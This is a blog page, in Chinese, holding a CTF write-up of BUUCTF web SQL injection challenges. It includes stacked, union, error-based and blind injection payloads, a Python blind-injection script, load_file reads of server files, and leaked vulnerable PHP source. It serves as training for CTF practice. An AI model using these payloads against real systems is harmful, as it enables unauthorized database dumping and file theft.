@@ -1,0 +1,1342 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+  <title>buuctf刷题-sql注入篇 - 明月归的小站</title>
+  
+    <meta name="keywords" content="web,buuctf,sql注入">
+  
+
+  
+    <meta name="description" content="本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/l-lin/font-awesome-animation/dist/font-awesome-animation.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+  
+  
+  <div class="cover-wrapper">
+    <cover class='cover post' style="display: none;">
+      <div class='cover-body'>
+  <div class='a'>
+    
+    
+    
+  </div>
+  <div class='b'>
+    <div class='menu navigation dock'>
+      <div class='list-h'>
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+      <div class="scroll-down" style="display: none;"><i class="fa fa-chevron-down scroll-down-effects"></i></div>
+    </cover>
+    <header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h m-phone' id="pjax-header-nav-list">
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h m-pc'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h m-phone'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="menuitem flat-box faa-parent animated-hover" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+  </div>
+  
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper' id="pjax-container">
+      
+        <!--此文件用来存放一些不方便取值的变量--> 
+<!--思路大概是将值藏到重加载的区域内--> 
+ 
+ 
+ 
+<div id="pjax-data" style="display: none"> 
+  <div id="pjax-ispage">true</div> 
+  <div id="pjax-pageTitle">buuctf刷题-sql注入篇</div> 
+  <div id="pjax-enable-cover">true</div> 
+  <div id="pjax-comment-path">none</div> 
+  <div id="pjax-comment-placeholder">none</div> 
+</div> 
+ 
+ 
+<script> 
+  // 处理封面 此时 jquery 还没加载 
+  if ("none" == "none") { // 移除封面 
+    document.getElementsByClassName('cover')[0].style.display = "none"; 
+    document.getElementsByClassName('l_body')[0].classList.add("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.add("show"); 
+  } else { 
+    if ("none" == "blog") { // 半屏 
+      document.getElementsByClassName('cover')[0].classList.remove("full"); 
+      document.getElementsByClassName('cover')[0].classList.add("half"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = "none"; 
+    } else if ("none" == "docs") { // 全屏 
+      document.getElementsByClassName('cover')[0].classList.remove("half"); 
+      document.getElementsByClassName('cover')[0].classList.add("full"); 
+      document.getElementsByClassName('scroll-down')[0].style.display = ""; 
+    } 
+    document.getElementsByClassName('cover')[0].style.display = ""; 
+    document.getElementsByClassName('l_body', 'show')[0].classList.remove("nocover"); 
+    document.getElementsByClassName('l_header', 'cover-wrapper')[0].classList.remove("show"); 
+  } 
+</script> 
+
+      
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/">
+      buuctf刷题-sql注入篇
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="/pic/youxiang.jpg">
+    <p>MoonBack</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：2020年1月16日</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          
+          <p>本篇博客主要记录了buuctf上web部分sql注入类型题目的writeup！持续更新！</p>
+<a id="more"></a>
+
+<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h3><p>可以看到过滤了很多东西</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/过滤.png" style="zoom: 67%;">
+
+<p>这题考察的是堆叠注入，因此我们可以先查询下数据库</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/数据库.png" style="zoom: 67%;">
+
+<p>不绕弯子，flag在supersqli里的1919810931114514表里，现在有两种方法可以得到flag</p>
+<h4 id="方式1"><a href="#方式1" class="headerlink" title="方式1"></a>方式1</h4><p>使用prepare和execute来构造语句从而绕过过滤，payload如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=<span class="number">1</span><span class="string">&#x27;%3BSet%40a%3D0x73656c656374202a2066726f6d20603139313938313039333131313435313460%3Bprepare+b+from+%40a%3Bexecute+b%3B%23</span></span><br></pre></td></tr></table></figure>
+
+<p>url解码后是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;Set@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare b from @a;execute b;#</span></span><br></pre></td></tr></table></figure>
+
+<p>其中那段16进制字符串的意思是</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span></span><br></pre></td></tr></table></figure>
+
+<p>类似的payload还有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;use supersqli;set @sql=concat(&#x27;</span>s<span class="string">&#x27;,&#x27;</span>elect `flag` <span class="keyword">from</span> `<span class="number">1919810931114514</span>`<span class="string">&#x27;);PREPARE stmt1 FROM @sql;EXECUTE stmt1;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方式2"><a href="#方式2" class="headerlink" title="方式2"></a>方式2</h4><p>这种思路算是骚套路了</p>
+<p>题目环境用的数据库和flag所在的数据库一样，都是supersqli，只不过两个表不同，因此我们可以改下表的名字，先看下表的结构</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;;use supersqli;show tables;show columns from `1919810931114514`;#</span></span><br><span class="line"><span class="string">1&#x27;</span>;<span class="keyword">use</span> <span class="title">supersqli</span>;show tables;show columns <span class="keyword">from</span> words;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/数字表结构.png" style="zoom:67%;">
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200114165010.png" style="zoom:67%;">
+
+<p>发现数字表只有flag这一列，而题目所使用的表有id,data两列，因此我们可以往数字表里插入一个名为id的列，然后将flag列重新命名为data，再将数字表名改为words，把words表改成其它名称，payload:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">TO</span> <span class="string">`test666`</span>;<span class="keyword">RENAME</span> <span class="keyword">TABLE</span> <span class="string">`1919810931114514`</span> <span class="keyword">TO</span> <span class="string">`words`</span>;<span class="keyword">ALTER</span> <span class="keyword">TABLE</span> <span class="string">`words`</span> <span class="keyword">ADD</span> <span class="keyword">COLUMN</span> <span class="keyword">id</span> <span class="built_in">INT</span>(<span class="number">11</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200114171454.png" style="zoom:67%;">
+
+<p>注意数字表要加反引号，id因为是刚插入的，应该为空，所以需要加个<code>or 1=1#</code></p>
+<h2 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>同样是堆叠注入，按照以前的思路发现能注出数据库为ctf，表为Flag，字段就没办法了</p>
+<p>不绕弯子，后台sql语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $_POST[<span class="string">&#x27;query&#x27;</span>]||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
+
+<p>解题payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1</span><br></pre></td></tr></table></figure>
+
+<p>相当于执行：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>;<span class="keyword">set</span> sql_mode=PIPES_AS_CONCAT;<span class="keyword">select</span> <span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200213135340.png" style="zoom: 80%;">
+
+<p><code>sql_modesql_mode</code>：是一组mysql支持的基本语法及校验规则，<code>PIPES_AS_CONCAT</code>：将“||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p>
+<p>还有个payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*,1</span><br></pre></td></tr></table></figure>
+
+<p>相当于执行:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> *,<span class="number">1</span>||flag <span class="keyword">from</span> Flag</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200213135531.png" style="zoom:80%;">
+
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>打开题目提示flag在flag表flag字段里，bool盲注，exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://fea4ab1f-7bf4-452f-9c2a-83dadf6f6315.node3.buuoj.cn&quot;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">	f1=flag</span><br><span class="line">	top=<span class="number">127</span></span><br><span class="line">	low=<span class="number">33</span></span><br><span class="line">	<span class="keyword">while</span> low&lt;=top:</span><br><span class="line">		mid=(top+low)//<span class="number">2</span></span><br><span class="line">		data=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">		data1=&#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&#x27;if(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))=&#123;&#125;,1,0)&#x27;</span>.format(str(i),str(mid))&#125;</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			r1=requests.post(url,data=data1)</span><br><span class="line">			print(i,mid)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">				flag+=chr(mid)</span><br><span class="line">				print(flag)</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			r=requests.post(url,data=data)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				top=mid<span class="number">-1</span></span><br><span class="line">			<span class="keyword">if</span> <span class="string">&#x27;glzjin&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				low=mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">	<span class="keyword">if</span> flag==f1:</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>还有种payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1^(if(ascii(substr((select(flag)from(flag)),1,1))&#x3D;100,1,0))</span><br></pre></td></tr></table></figure>
+
+<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><h3 id="writeup-3"><a href="#writeup-3" class="headerlink" title="writeup"></a>writeup</h3><p>扫目录，发现<code>flag.php</code>和<code>robots.txt</code>，访问看到<code>user.php.bak</code>，得到</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$name, $age, $blog</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>随便注册个账号进去，在<code>view.php?no=</code>发现存在注入</p>
+<p><code>order by</code> 判断出有四列，试了试联合查询，发现直接<code>union select</code>被waf拦了</p>
+<p>尝试 <code>union/**/select</code>发现可以成功绕过，判断回显位，发现是第二位</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406104336.png" style="zoom:80%;">
+
+<p>接着就是爆数据库，表，列</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata%<span class="number">23</span></span><br><span class="line"><span class="comment"># 得到fakebook,information_schema,mysql,performance_schema,test</span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables where table_schema=database()%<span class="number">23</span></span><br><span class="line"><span class="comment"># 得到users</span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema=database()%<span class="number">23</span></span><br><span class="line"><span class="comment"># 得到no,username,passwd,data </span></span><br><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,concat(no,<span class="string">&#x27; &#x27;</span>,username,<span class="string">&#x27; &#x27;</span>,passwd,<span class="string">&#x27; &#x27;</span>,data),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> fakebook.users where no=<span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>发现用16进制分割的时候会被waf拦，直接用空格字符串</p>
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406110341.png" style="zoom:80%;">
+
+<p>发现最后一列的值是序列化的结果，应该和前面的源码泄露有关</p>
+<p>注入这里也可以用报错注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,database()))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_schema=database() <span class="keyword">and</span> table_name=<span class="string">&#x27;users&#x27;</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line">view.php?no=<span class="number">-1</span> <span class="keyword">and</span> extractvalue(<span class="number">1</span>,concat(<span class="number">1</span>,(select group_concat(data) <span class="keyword">from</span> fakebook.users where no=<span class="number">1</span>)))%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>在爆内容的时候发现不全，这是因为报错注入长度限制，默认为32个字符，我们先用length爆一下长度，再用left,right,reverse来看到全部内容</p>
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406112742.png"></p>
+<p>看其他大佬的操作，还可以用make_set函数，之前没用过，这里记一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">1</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,make_set(<span class="number">3</span>,<span class="string">&#x27;~&#x27;</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database())),<span class="number">1</span>)<span class="comment">#</span></span><br><span class="line"><span class="comment"># 回显前两列</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM截图20200406113240.png" style="zoom:80%;">
+
+<p>详细可以看：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41725312/article/details/83039525">https://blog.csdn.net/qq_41725312/article/details/83039525</a></p>
+<p>题目可以直接load_file读文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view.php?no=<span class="number">-1</span> union<span class="comment">/**/</span>select <span class="number">1</span>,load_file(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>),<span class="number">3</span>,<span class="number">4</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>直接读<code>flag.php</code>可以得到flag</p>
+<p><img src="/2020/01/16/buuctf%E5%88%B7%E9%A2%98-sql%E6%B3%A8%E5%85%A5%E7%AF%87/TIM%E6%88%AA%E5%9B%BE20200406113721.png"></p>
+<p>读<code>index.php</code>发现存在反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> ($db-&gt;getAllUsers() <span class="keyword">as</span> $user)</span><br><span class="line">&#123;</span><br><span class="line">$data = unserialize($user[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span class="subst">&#123;$user[&#x27;no&#x27;]&#125;</span>&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;&lt;a href=&#x27;view.php?no=<span class="subst">&#123;$user[&#x27;no&#x27;]&#125;</span>&#x27;&gt;<span class="subst">&#123;$user[&#x27;username&#x27;]&#125;</span>&lt;/a&gt;&lt;/td&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;td&gt;<span 